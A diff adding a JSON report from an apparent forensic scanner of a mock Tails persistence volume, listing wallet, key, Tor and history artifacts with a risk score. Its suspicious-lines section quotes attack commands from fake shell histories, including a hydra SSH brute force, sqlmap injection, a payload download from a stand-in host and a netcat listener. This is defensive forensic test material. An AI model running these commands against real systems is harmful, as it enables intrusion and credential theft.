@@ -1,0 +1,976 @@
+{
+  "meta": {
+    "tool": "tails_volume_deep_scan",
+    "version": "1.0",
+    "generated_utc": "2026-03-16T21:46:36.335208+00:00",
+    "host": "SUSHANKYA",
+    "duration_seconds": 0.091
+  },
+  "input": {
+    "mount_path": "/media/aparichit/TailsData"
+  },
+  "mount": {
+    "mount_path": "/media/aparichit/TailsData",
+    "exists": true,
+    "is_dir": true,
+    "device": "/dev/mapper/luks-de44407a-365e-4dd8-94da-55c607299e1d",
+    "fstype": "ext4",
+    "mount_opts": "rw,nosuid,nodev,relatime,errors=remount-ro",
+    "statvfs": {
+      "total_bytes": 6682447872,
+      "used_bytes": 18051072,
+      "free_bytes": 6664396800,
+      "available_bytes": 6303215616
+    }
+  },
+  "artifacts": {
+    "filesystem_inventory": {
+      "counts": {
+        "files": 33,
+        "dirs": 41,
+        "symlinks": 0,
+        "other": 5,
+        "errors": 0,
+        "scanned_entries": 78,
+        "truncated": false
+      },
+      "top_extensions": [
+        [
+          "<no_ext>",
+          11
+        ],
+        [
+          ".conf",
+          5
+        ],
+        [
+          ".txt",
+          2
+        ],
+        [
+          ".gpg",
+          2
+        ],
+        [
+          ".kbx",
+          2
+        ],
+        [
+          ".kbx~",
+          1
+        ],
+        [
+          ".db",
+          1
+        ],
+        [
+          ".csv",
+          1
+        ],
+        [
+          ".raw",
+          1
+        ],
+        [
+          ".img",
+          1
+        ],
+        [
+          ".sh",
+          1
+        ],
+        [
+          ".keys",
+          1
+        ],
+        [
+          ".dat",
+          1
+        ],
+        [
+          ".js",
+          1
+        ],
+        [
+          ".sqlite",
+          1
+        ],
+        [
+          ".html",
+          1
+        ]
+      ],
+      "file_types": {
+        "other": 22,
+        "documents": 2,
+        "keys": 4,
+        "databases": 3,
+        "scripts": 2
+      },
+      "top_dirs_by_file_count": [
+        [
+          "gnupg",
+          12
+        ],
+        [
+          "home",
+          12
+        ],
+        [
+          "Persistent",
+          5
+        ],
+        [
+          "var",
+          3
+        ],
+        [
+          ".",
+          2
+        ],
+        [
+          "live",
+          1
+        ],
+        [
+          "etc",
+          1
+        ],
+        [
+          "apt",
+          1
+        ],
+        [
+          "electrum",
+          1
+        ],
+        [
+          "bookmarks",
+          0
+        ],
+        [
+          "tmp",
+          0
+        ],
+        [
+          "openssh-client",
+          0
+        ],
+        [
+          "lost+found",
+          0
+        ],
+        [
+          "dont-ask-again",
+          0
+        ]
+      ],
+      "largest_files": [
+        {
+          "size": 8388608,
+          "path": "Persistent/Archives/disk_clone_part1.img"
+        },
+        {
+          "size": 5242880,
+          "path": "Persistent/Archives/capture.raw"
+        },
+        {
+          "size": 1197568,
+          "path": "gnupg/pubring.kbx"
+        },
+        {
+          "size": 1192030,
+          "path": "gnupg/pubring.kbx~"
+        },
+        {
+          "size": 49152,
+          "path": "gnupg/tofu.db"
+        },
+        {
+          "size": 1987,
+          "path": "gnupg/gpg.conf"
+        },
+        {
+          "size": 1200,
+          "path": "gnupg/trustdb.gpg"
+        },
+        {
+          "size": 561,
+          "path": "var/log/syslog"
+        },
+        {
+          "size": 501,
+          "path": "persistence.conf"
+        },
+        {
+          "size": 458,
+          "path": "live/persistence/TailsData_unlocked/persistence.conf"
+        },
+        {
+          "size": 292,
+          "path": "etc/tor/torrc"
+        },
+        {
+          "size": 284,
+          "path": "var/log/tor/log"
+        },
+        {
+          "size": 270,
+          "path": "Persistent/Documents/attack_notes.txt"
+        },
+        {
+          "size": 212,
+          "path": "home/amnesia/.bash_history"
+        },
+        {
+          "size": 138,
+          "path": "home/amnesia/.zsh_history"
+        },
+        {
+          "size": 113,
+          "path": "electrum/config"
+        },
+        {
+          "size": 109,
+          "path": "home/amnesia/.ssh/id_rsa"
+        },
+        {
+          "size": 101,
+          "path": "home/amnesia/.tor-browser/profile.default/bookmarks.html"
+        },
+        {
+          "size": 92,
+          "path": "home/amnesia/.tor-browser/profile.default/prefs.js"
+        },
+        {
+          "size": 87,
+          "path": "gnupg/dirmngr.conf"
+        },
+        {
+          "size": 87,
+          "path": "Persistent/Scripts/recon.sh"
+        },
+        {
+          "size": 86,
+          "path": "Persistent/Documents/credentials_dump.csv"
+        },
+        {
+          "size": 81,
+          "path": "home/amnesia/.electrum/wallets/default_wallet"
+        },
+        {
+          "size": 68,
+          "path": "home/amnesia/.ssh/authorized_keys"
+        },
+        {
+          "size": 65,
+          "path": "var/lib/tor/hidden_service/hostname"
+        },
+        {
+          "size": 40,
+          "path": "home/amnesia/.monero/wallets/wallet1.keys"
+        },
+        {
+          "size": 39,
+          "path": "home/amnesia/.bitcoin/wallet.dat"
+        },
+        {
+          "size": 35,
+          "path": "home/amnesia/.gnupg/pubring.kbx"
+        },
+        {
+          "size": 32,
+          "path": "home/amnesia/.gnupg/trustdb.gpg"
+        },
+        {
+          "size": 20,
+          "path": "home/amnesia/.tor-browser/profile.default/places.sqlite"
+        },
+        {
+          "size": 18,
+          "path": "text.txt"
+        },
+        {
+          "size": 8,
+          "path": "gnupg/gpg-agent.conf"
+        },
+        {
+          "size": 0,
+          "path": "apt/cache/lock"
+        }
+      ],
+      "timeline": [
+        {
+          "ts": "2026-03-16T21:32:10.453412+00:00",
+          "event": "modified",
+          "path": "live/persistence/TailsData_unlocked/persistence.conf",
+          "size": 458
+        },
+        {
+          "ts": "2026-03-16T21:32:10.403412+00:00",
+          "event": "modified",
+          "path": "persistence.conf",
+          "size": 501
+        },
+        {
+          "ts": "2026-03-16T21:31:27.807034+00:00",
+          "event": "modified",
+          "path": "Persistent/Archives/capture.raw",
+          "size": 5242880
+        },
+        {
+          "ts": "2026-03-16T21:31:27.795034+00:00",
+          "event": "modified",
+          "path": "Persistent/Archives/disk_clone_part1.img",
+          "size": 8388608
+        },
+        {
+          "ts": "2026-03-16T21:31:27.762033+00:00",
+          "event": "modified",
+          "path": "Persistent/Scripts/recon.sh",
+          "size": 87
+        },
+        {
+          "ts": "2026-03-16T21:31:27.748033+00:00",
+          "event": "modified",
+          "path": "Persistent/Documents/credentials_dump.csv",
+          "size": 86
+        },
+        {
+          "ts": "2026-03-16T21:31:27.735033+00:00",
+          "event": "modified",
+          "path": "Persistent/Documents/attack_notes.txt",
+          "size": 270
+        },
+        {
+          "ts": "2026-03-16T21:31:27.715033+00:00",
+          "event": "modified",
+          "path": "home/amnesia/.tor-browser/profile.default/places.sqlite",
+          "size": 20
+        },
+        {
+          "ts": "2026-03-16T21:31:27.702033+00:00",
+          "event": "modified",
+          "path": "home/amnesia/.tor-browser/profile.default/prefs.js",
+          "size": 92
+        },
+        {
+          "ts": "2026-03-16T21:31:27.686033+00:00",
+          "event": "modified",
+          "path": "home/amnesia/.tor-browser/profile.default/bookmarks.html",
+          "size": 101
+        },
+        {
+          "ts": "2026-03-16T21:31:27.669033+00:00",
+          "event": "modified",
+          "path": "home/amnesia/.monero/wallets/wallet1.keys",
+          "size": 40
+        },
+        {
+          "ts": "2026-03-16T21:31:27.654032+00:00",
+          "event": "modified",
+          "path": "home/amnesia/.bitcoin/wallet.dat",
+          "size": 39
+        },
+        {
+          "ts": "2026-03-16T21:31:27.639032+00:00",
+          "event": "modified",
+          "path": "home/amnesia/.electrum/wallets/default_wallet",
+          "size": 81
+        },
+        {
+          "ts": "2026-03-16T21:31:27.624032+00:00",
+          "event": "modified",
+          "path": "home/amnesia/.gnupg/trustdb.gpg",
+          "size": 32
+        },
+        {
+          "ts": "2026-03-16T21:31:27.610032+00:00",
+          "event": "modified",
+          "path": "home/amnesia/.gnupg/pubring.kbx",
+          "size": 35
+        },
+        {
+          "ts": "2026-03-16T21:31:27.596032+00:00",
+          "event": "modified",
+          "path": "home/amnesia/.ssh/authorized_keys",
+          "size": 68
+        },
+        {
+          "ts": "2026-03-16T21:31:27.582032+00:00",
+          "event": "modified",
+          "path": "home/amnesia/.ssh/id_rsa",
+          "size": 109
+        },
+        {
+          "ts": "2026-03-16T21:31:27.568032+00:00",
+          "event": "modified",
+          "path": "home/amnesia/.zsh_history",
+          "size": 138
+        },
+        {
+          "ts": "2026-03-16T21:31:27.550031+00:00",
+          "event": "modified",
+          "path": "home/amnesia/.bash_history",
+          "size": 212
+        },
+        {
+          "ts": "2026-03-16T21:31:27.532031+00:00",
+          "event": "modified",
+          "path": "var/log/tor/log",
+          "size": 284
+        },
+        {
+          "ts": "2026-03-16T21:31:27.513031+00:00",
+          "event": "modified",
+          "path": "var/log/syslog",
+          "size": 561
+        },
+        {
+          "ts": "2026-03-16T21:31:27.488031+00:00",
+          "event": "modified",
+          "path": "var/lib/tor/hidden_service/hostname",
+          "size": 65
+        },
+        {
+          "ts": "2026-03-16T21:31:27.474031+00:00",
+          "event": "modified",
+          "path": "etc/tor/torrc",
+          "size": 292
+        },
+        {
+          "ts": "2026-03-16T21:21:06.258520+00:00",
+          "event": "modified",
+          "path": "text.txt",
+          "size": 18
+        },
+        {
+          "ts": "2026-02-10T15:45:56.960000+00:00",
+          "event": "modified",
+          "path": "gnupg/trustdb.gpg",
+          "size": 1200
+        },
+        {
+          "ts": "2026-02-10T15:45:56.956000+00:00",
+          "event": "modified",
+          "path": "gnupg/pubring.kbx",
+          "size": 1197568
+        },
+        {
+          "ts": "2026-02-10T15:45:56.912000+00:00",
+          "event": "modified",
+          "path": "gnupg/pubring.kbx~",
+          "size": 1192030
+        },
+        {
+          "ts": "2026-02-10T15:45:56.884000+00:00",
+          "event": "modified",
+          "path": "gnupg/tofu.db",
+          "size": 49152
+        },
+        {
+          "ts": "2026-02-10T15:45:38.428000+00:00",
+          "event": "modified",
+          "path": "gnupg/gpg.conf",
+          "size": 1987
+        },
+        {
+          "ts": "2026-02-10T15:45:38.424000+00:00",
+          "event": "modified",
+          "path": "gnupg/gpg-agent.conf",
+          "size": 8
+        },
+        {
+          "ts": "2026-02-10T15:45:38.420000+00:00",
+          "event": "modified",
+          "path": "gnupg/dirmngr.conf",
+          "size": 87
+        },
+        {
+          "ts": "2026-02-10T15:45:38.380000+00:00",
+          "event": "modified",
+          "path": "electrum/config",
+          "size": 113
+        },
+        {
+          "ts": "2026-02-10T15:45:17+00:00",
+          "event": "modified",
+          "path": "apt/cache/lock",
+          "size": 0
+        }
+      ]
+    },
+    "persistence": {
+      "found": true,
+      "path": "/media/aparichit/TailsData/persistence.conf",
+      "modules": [
+        {
+          "source": "/home/amnesia/Persistent",
+          "destination": "/home/amnesia/Persistent"
+        },
+        {
+          "source": "/home/amnesia/.ssh",
+          "destination": "/home/amnesia/.ssh"
+        },
+        {
+          "source": "/home/amnesia/.gnupg",
+          "destination": "/home/amnesia/.gnupg"
+        },
+        {
+          "source": "/home/amnesia/.electrum",
+          "destination": "/home/amnesia/.electrum"
+        },
+        {
+          "source": "/home/amnesia/.bitcoin",
+          "destination": "/home/amnesia/.bitcoin"
+        },
+        {
+          "source": "/home/amnesia/.tor-browser",
+          "destination": "/home/amnesia/.tor-browser"
+        }
+      ],
+      "raw_preview": [
+        "# Parser-friendly mock persistence modules",
+        "/home/amnesia/Persistent",
+        "source=Persistent",
+        "destination=/home/amnesia/Persistent",
+        "",
+        "/home/amnesia/.ssh",
+        "source=openssh-client",
+        "destination=/home/amnesia/.ssh",
+        "",
+        "/home/amnesia/.gnupg",
+        "source=gnupg",
+        "destination=/home/amnesia/.gnupg",
+        "",
+        "/home/amnesia/.electrum",
+        "source=electrum",
+        "destination=/home/amnesia/.electrum",
+        "",
+        "/home/amnesia/.bitcoin",
+        "source=bitcoin",
+        "destination=/home/amnesia/.bitcoin",
+        "",
+        "/home/amnesia/.tor-browser",
+        "source=tor-browser",
+        "destination=/home/amnesia/.tor-browser"
+      ]
+    },
+    "interesting_paths": {
+      "tails_markers": [
+        "live",
+        "persistence.conf",
+        "live/persistence",
+        "live/persistence/TailsData_unlocked",
+        "live/persistence/TailsData_unlocked/persistence.conf",
+        "home/amnesia",
+        "home/amnesia/.monero",
+        "home/amnesia/.electrum",
+        "home/amnesia/.bitcoin",
+        "home/amnesia/.tor-browser",
+        "home/amnesia/.ssh",
+        "home/amnesia/.gnupg",
+        "home/amnesia/.bash_history",
+        "home/amnesia/.zsh_history",
+        "home/amnesia/.monero/wallets",
+        "home/amnesia/.monero/wallets/wallet1.keys",
+        "home/amnesia/.electrum/wallets",
+        "home/amnesia/.electrum/wallets/default_wallet",
+        "home/amnesia/.bitcoin/wallet.dat",
+        "home/amnesia/.tor-browser/profile.default",
+        "home/amnesia/.tor-browser/profile.default/prefs.js",
+        "home/amnesia/.tor-browser/profile.default/places.sqlite",
+        "home/amnesia/.tor-browser/profile.default/bookmarks.html",
+        "home/amnesia/.ssh/authorized_keys",
+        "home/amnesia/.ssh/id_rsa",
+        "home/amnesia/.gnupg/private-keys-v1.d",
+        "home/amnesia/.gnupg/trustdb.gpg",
+        "home/amnesia/.gnupg/pubring.kbx"
+      ],
+      "wallet_paths": [
+        "electrum",
+        "home/amnesia/.monero",
+        "home/amnesia/.electrum",
+        "home/amnesia/.bitcoin",
+        "home/amnesia/.monero/wallets",
+        "home/amnesia/.monero/wallets/wallet1.keys",
+        "home/amnesia/.electrum/wallets",
+        "home/amnesia/.electrum/wallets/default_wallet",
+        "home/amnesia/.bitcoin/wallet.dat",
+        "electrum/config"
+      ],
+      "key_paths": [
+        "gnupg/private-keys-v1.d",
+        "gnupg/S.gpg-agent.ssh",
+        "home/amnesia/.ssh",
+        "home/amnesia/.gnupg",
+        "home/amnesia/.monero/wallets/wallet1.keys",
+        "home/amnesia/.ssh/authorized_keys",
+        "home/amnesia/.ssh/id_rsa",
+        "home/amnesia/.gnupg/private-keys-v1.d",
+        "home/amnesia/.gnupg/trustdb.gpg",
+        "home/amnesia/.gnupg/pubring.kbx"
+      ],
+      "tor_paths": [
+        "etc/tor",
+        "etc/tor/torrc",
+        "var/lib/tor",
+        "var/lib/tor/hidden_service",
+        "var/lib/tor/hidden_service/hostname",
+        "var/log/tor",
+        "var/log/tor/log",
+        "home/amnesia/.tor-browser",
+        "home/amnesia/.bash_history",
+        "home/amnesia/.zsh_history",
+        "home/amnesia/.tor-browser/profile.default",
+        "home/amnesia/.tor-browser/profile.default/prefs.js",
+        "home/amnesia/.tor-browser/profile.default/places.sqlite",
+        "home/amnesia/.tor-browser/profile.default/bookmarks.html"
+      ],
+      "logs": [
+        "var/log",
+        "var/log/tor",
+        "var/log/syslog",
+        "var/log/tor/log"
+      ],
+      "history_paths": [
+        "home/amnesia/.bash_history",
+        "home/amnesia/.zsh_history"
+      ]
+    },
+    "text_scan": {
+      "text_files_scanned": 27,
+      "onion_addresses": [
+        "abcdefghijklmnop.onion",
+        "qrstuvwxyzabcdef.onion",
+        "suspiciousmarketabcdef.onion",
+        "zkaan2xfbuxia2wpf7ofnkbz6r5zdbbvxbunvp5g2iebopbfc4iqmbad.onion",
+        "zzzzzzzzzzzzzzzz.onion"
+      ],
+      "btc_like_strings": [
+        "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
+      ],
+      "eth_like_strings": [
+        "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
+        "0xD8692123C4065DEA5E0F3AB5249B39D24F25E3B6"
+      ],
+      "xmr_like_strings": [],
+      "ip_addresses": [
+        "10.0.0.22",
+        "10.0.0.8",
+        "10.10.10.0",
+        "10.10.10.20",
+        "10.10.10.21",
+        "127.0.0.1",
+        "172.16.10.5",
+        "192.0.2.1",
+        "198.51.100.12"
+      ],
+      "suspicious_lines": [
+        {
+          "path": "persistence.conf",
+          "line": "/home/amnesia/.ssh"
+        },
+        {
+          "path": "persistence.conf",
+          "line": "destination=/home/amnesia/.ssh"
+        },
+        {
+          "path": "live/persistence/TailsData_unlocked/persistence.conf",
+          "line": "/home/amnesia/.ssh"
+        },
+        {
+          "path": "live/persistence/TailsData_unlocked/persistence.conf",
+          "line": "destination=/home/amnesia/.ssh"
+        },
+        {
+          "path": "Persistent/Scripts/recon.sh",
+          "line": "nmap -sV -Pn 10.10.10.0/24"
+        },
+        {
+          "path": "Persistent/Scripts/recon.sh",
+          "line": "torsocks wget http://exampleabcdef1234.onion/data"
+        },
+        {
+          "path": "var/log/syslog",
+          "line": "Mar 17 01:25:11 tails bash[2031]: nmap -sV -Pn 10.10.10.20"
+        },
+        {
+          "path": "var/log/syslog",
+          "line": "Mar 17 01:26:42 tails bash[2031]: proxychains sqlmap -u https://target.local/item.php?id=1 --dbs"
+        },
+        {
+          "path": "var/log/syslog",
+          "line": "Mar 17 01:29:00 tails bash[2031]: curl -s http://suspiciousmarketabcdef.onion/status"
+        },
+        {
+          "path": "var/log/syslog",
+          "line": "Mar 17 01:31:20 tails ssh[2104]: Accepted publickey for amnesia from 10.0.0.8 port 52221"
+        },
+        {
+          "path": "home/amnesia/.bash_history",
+          "line": "torsocks curl http://abcdefghijklmnop.onion"
+        },
+        {
+          "path": "home/amnesia/.bash_history",
+          "line": "nmap -sS -T4 172.16.10.5"
+        },
+        {
+          "path": "home/amnesia/.bash_history",
+          "line": "hydra -l admin -P rockyou.txt ssh://10.0.0.22"
+        },
+        {
+          "path": "home/amnesia/.bash_history",
+          "line": "wget http://drop.example.net/payload.bin"
+        },
+        {
+          "path": "home/amnesia/.bash_history",
+          "line": "python -m http.server 8080"
+        },
+        {
+          "path": "home/amnesia/.bash_history",
+          "line": "gpg --import stolen_keys.asc"
+        },
+        {
+          "path": "home/amnesia/.zsh_history",
+          "line": ": 1710642000:0;proxychains4 nc -lvnp 4444"
+        },
+        {
+          "path": "home/amnesia/.zsh_history",
+          "line": ": 1710642040:0;bitcoin-cli getwalletinfo"
+        },
+        {
+          "path": "home/amnesia/.zsh_history",
+          "line": ": 1710642070:0;monero-wallet-cli --wallet-file wallet1"
+        },
+        {
+          "path": "home/amnesia/.ssh/authorized_keys",
+          "line": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMockKeyMaterial attacker@tails"
+        },
+        {
+          "path": "home/amnesia/.gnupg/pubring.kbx",
+          "line": "Mock GPG keyring bytes placeholder"
+        }
+      ],
+      "bridge_related_lines": [
+        {
+          "path": "etc/tor/torrc",
+          "line": "UseBridges 1"
+        },
+        {
+          "path": "etc/tor/torrc",
+          "line": "ClientTransportPlugin obfs4 exec /usr/bin/obfs4proxy"
+        },
+        {
+          "path": "etc/tor/torrc",
+          "line": "Bridge obfs4 198.51.100.12:443 0A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D cert=abcd iat-mode=0"
+        },
+        {
+          "path": "etc/tor/torrc",
+          "line": "Bridge snowflake 192.0.2.1:443"
+        }
+      ],
+      "hidden_service_lines": [
+        {
+          "path": "etc/tor/torrc",
+          "line": "HiddenServiceDir /var/lib/tor/hidden_service/"
+        },
+        {
+          "path": "etc/tor/torrc",
+          "line": "HiddenServicePort 80 127.0.0.1:8080"
+        }
+      ]
+    },
+    "key_wallet_browser": {
+      "key_files": [
+        {
+          "path": "gnupg/trustdb.gpg",
+          "size": 1200
+        },
+        {
+          "path": "gnupg/pubring.kbx",
+          "size": 1197568
+        },
+        {
+          "path": "home/amnesia/.monero/wallets/wallet1.keys",
+          "size": 40
+        },
+        {
+          "path": "home/amnesia/.ssh/authorized_keys",
+          "size": 68
+        },
+        {
+          "path": "home/amnesia/.ssh/id_rsa",
+          "size": 109
+        },
+        {
+          "path": "home/amnesia/.gnupg/trustdb.gpg",
+          "size": 32
+        },
+        {
+          "path": "home/amnesia/.gnupg/pubring.kbx",
+          "size": 35
+        }
+      ],
+      "wallet_files": [
+        {
+          "path": "home/amnesia/.monero/wallets/wallet1.keys",
+          "size": 40
+        },
+        {
+          "path": "home/amnesia/.electrum/wallets/default_wallet",
+          "size": 81
+        },
+        {
+          "path": "home/amnesia/.bitcoin/wallet.dat",
+          "size": 39
+        },
+        {
+          "path": "electrum/config",
+          "size": 113
+        }
+      ],
+      "browser_files": [
+        {
+          "path": "home/amnesia/.tor-browser/profile.default/prefs.js",
+          "size": 92
+        },
+        {
+          "path": "home/amnesia/.tor-browser/profile.default/places.sqlite",
+          "size": 20
+        },
+        {
+          "path": "home/amnesia/.tor-browser/profile.default/bookmarks.html",
+          "size": 101
+        }
+      ]
+    },
+    "mount_root_listing": [
+      "Persistent",
+      "apt",
+      "bookmarks",
+      "dont-ask-again",
+      "electrum",
+      "etc",
+      "gnupg",
+      "home",
+      "live",
+      "lost+found",
+      "openssh-client",
+      "persistence.conf",
+      "text.txt",
+      "tmp",
+      "var"
+    ],
+    "evidence_collection": {
+      "enabled": true,
+      "collect_dir": "/home/aparichit/Projects/OSForensics/tails_collected_20260316_214636Z",
+      "manifest_path": "/home/aparichit/Projects/OSForensics/tails_collected_20260316_214636Z/collection_manifest.json",
+      "collected_files_root": "/home/aparichit/Projects/OSForensics/tails_collected_20260316_214636Z/collected_files",
+      "copied_count": 26,
+      "skipped_count": 0,
+      "copied_bytes": 14833940,
+      "max_copy_bytes": 26214400
+    },
+    "largest_file_hash_samples": [
+      {
+        "path": "Persistent/Archives/disk_clone_part1.img",
+        "sha256_first_bytes": "6506614505e113daab08b3f894ca46d4d61867c7b007c413b47a669abe8aae67"
+      },
+      {
+        "path": "Persistent/Archives/capture.raw",
+        "sha256_first_bytes": "c036cbb7553a909f8b8877d4461924307f27ecb66cff928eeeafd569c3887e29"
+      },
+      {
+        "path": "gnupg/pubring.kbx",
+        "sha256_first_bytes": "6b645390729bb0cc4a45f77f566346df194ff9c7af40589551bfd1289b23e0f9"
+      },
+      {
+        "path": "gnupg/pubring.kbx~",
+        "sha256_first_bytes": "e97c4bafbd9b14137a0d503dfe8da6622d1e8ac111e929ebe9e1e9004a93160f"
+      },
+      {
+        "path": "gnupg/tofu.db",
+        "sha256_first_bytes": "808f3138c7720130d458713f79032d65dd8ebbe8f85eca814599f2154acff308"
+      },
+      {
+        "path": "gnupg/gpg.conf",
+        "sha256_first_bytes": "b014d237e5f4766ce384080d55494a33b202aab4641aa7596249afe3f5d03589"
+      },
+      {
+        "path": "gnupg/trustdb.gpg",
+        "sha256_first_bytes": "8be6814213e27e41e8235e99a0b5434ce40d214dd893b5caef2454df27999db9"
+      },
+      {
+        "path": "var/log/syslog",
+        "sha256_first_bytes": "62c84fe4d851c211fb5d3b2c7e2c0d0c2e642d9ee5717484fad7e612657664af"
+      },
+      {
+        "path": "persistence.conf",
+        "sha256_first_bytes": "3a1f02a6133618e88dab3ecc4043524a9e813a6599ac175bf4a08c35f94c573a"
+      },
+      {
+        "path": "live/persistence/TailsData_unlocked/persistence.conf",
+        "sha256_first_bytes": "9b428628bc6c38543933602cf0af5f0cb4a967f3d2808a942ecb324870e5d2cf"
+      },
+      {
+        "path": "etc/tor/torrc",
+        "sha256_first_bytes": "6433c2bed3fa2e6f9f7fcd4a444f4896539fb3c7ac47eb1e66ef2e2cfce9f50f"
+      },
+      {
+        "path": "var/log/tor/log",
+        "sha256_first_bytes": "5f7d503af838adb652d082f120166eddae2c32cdce56053de4774d48b72bcf21"
+      },
+      {
+        "path": "Persistent/Documents/attack_notes.txt",
+        "sha256_first_bytes": "ae8f7943e84b691c4f160d50528344aeab644d435f8fcca9565e0faa1ef2077e"
+      },
+      {
+        "path": "home/amnesia/.bash_history",
+        "sha256_first_bytes": "d38e9496614513f69db883d9cb2624ec06f513351aa43b0997e8ac1be587486b"
+      },
+      {
+        "path": "home/amnesia/.zsh_history",
+        "sha256_first_bytes": "cd2dc7281d273d5e5b2e3053457c816495b8f32c14ae0b37eb26264ec08a80c4"
+      },
+      {
+        "path": "electrum/config",
+        "sha256_first_bytes": "c9278fbfbe89203d8a7b16d98c5deb2d803e3b83f64305ba8ae3c7b98aefa998"
+      },
+      {
+        "path": "home/amnesia/.ssh/id_rsa",
+        "sha256_first_bytes": "7bdd472064706dc183fbb2721ec136895713d7c5e8831278b5cbccf1ad45b95f"
+      },
+      {
+        "path": "home/amnesia/.tor-browser/profile.default/bookmarks.html",
+        "sha256_first_bytes": "07eb00528d0e1a9e43e047933a45b65b81f105cbf195b226f50d8ccabe06bbc5"
+      },
+      {
+        "path": "home/amnesia/.tor-browser/profile.default/prefs.js",
+        "sha256_first_bytes": "3c6188012fbe8e452a8c7a9862b92dc7e8995e0f0ffb7e819fe9068b773ce627"
+      },
+      {
+        "path": "gnupg/dirmngr.conf",
+        "sha256_first_bytes": "00e6c32e7b965019a98b1975498eed74e54d6bfc1ac15bf9f27ad32f4e904237"
+      }
+    ]
+  },
+  "summary": {
+    "status": "ok",
+    "risk": {
+      "score": 100,
+      "max": 100,
+      "risk_level": "critical",
+      "reasons": [
+        "Persistence modules configured",
+        "Onion addresses detected (5)",
+        "Tor bridge configuration traces found",
+        "Hidden service configuration traces found",
+        "Suspicious command lines found (21)",
+        "Identity/key artifacts found (7)",
+        "Cryptocurrency wallet indicators found",
+        "Tor Browser artifacts found (3)"
+      ]
+    }
+  }
+}
